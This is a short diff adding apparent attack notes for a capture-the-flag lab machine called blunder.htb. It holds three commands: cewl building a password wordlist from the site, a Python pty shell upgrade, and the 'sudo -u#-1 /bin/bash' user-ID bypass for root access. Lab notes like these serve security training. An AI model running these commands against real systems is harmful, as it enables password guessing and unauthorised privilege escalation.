@@ -1,0 +1,5 @@
+cewl -d 3 -m 5 -w pass_list.txt http://blunder.htb
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+sudo -u#-1 /bin/bash
